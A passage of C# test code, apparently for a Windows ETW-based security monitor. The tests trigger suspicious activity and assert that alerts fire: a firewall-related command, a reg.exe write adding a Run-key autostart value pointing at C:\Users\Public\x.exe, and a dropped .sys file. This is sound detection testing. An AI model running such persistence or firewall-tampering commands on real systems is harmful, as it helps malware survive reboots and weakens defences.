            Alert p = Wait(c, x => x.Kind == "process" && x.Severity == Sev.Danger && x.Detail.Contains("güvenlik duvarını", StringComparison.OrdinalIgnoreCase) || x.Kind == "process" && x.Severity == Sev.Danger && x.Detail.Contains("Güvenlik duvarını"), 10000);
            Check("etw: dangerous command line flagged live", p != null);
            Check("etw: alert carries the command", p != null && p.Detail.Contains("advfirewall"));

            string name = "NobetciEtwTest";
            List<string> raw = new List<string>();
            List<string> regdbg = new List<string>();
            eng.Etw.DebugRaw = regdbg;
            eng.Etw.RegistryWritten += ev => { if ((ev.Value ?? "").Contains(name) || (ev.Key ?? "").Contains(name)) lock (raw) raw.Add("pid=" + ev.Pid + " key=[" + ev.Key + "] value=[" + ev.Value + "]"); };
            RunHidden("reg.exe", "add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + name + " /d C:\\Users\\Public\\x.exe /f");
            Alert r = Wait(c, x => x.Kind == "autorun" && x.Title.Contains(name), 12000);
            Check("etw: new Run value detected", r != null);
            Check("etw: culprit named from kernel registry events", r != null && r.Detail.Contains("reg.exe"), r == null ? null : r.Detail.Replace(Environment.NewLine, " | "));
            RunHidden("reg.exe", "delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + name + " /f");

            string sys = Path.Combine(Path.GetTempPath(), "nobetci_test_" + Guid.NewGuid().ToString("N").Substring(0, 6) + ".sys");
            RunHidden("cmd.exe", "/c type nul > \"" + sys + "\"");
            Alert f = Wait(c, x => x.Kind == "file" && x.Detail.Contains(".sys"), 10000);
            Check("etw: dropped .sys file flagged", f != null);
            try { File.Delete(sys); } catch { }

            int benign; lock (c.All) benign = c.All.Count(x => x.Kind == "process" && x.Detail.Contains("systeminfo"));
            RunHidden("cmd.exe", "/c ver");
            Thread.Sleep(1500);
            int benign2; lock (c.All) benign2 = c.All.Count(x => x.Kind == "process" && x.Detail.Contains("/c ver"));
            Check("etw: ordinary command stays quiet", benign2 == 0 && benign == 0);

            LiveSpy(eng, c);
            LiveRansom(eng, c, docs);
            LiveScan(c, tmp);

            eng.Dispose();
            Hub.Sink = null;
        }
    }
}
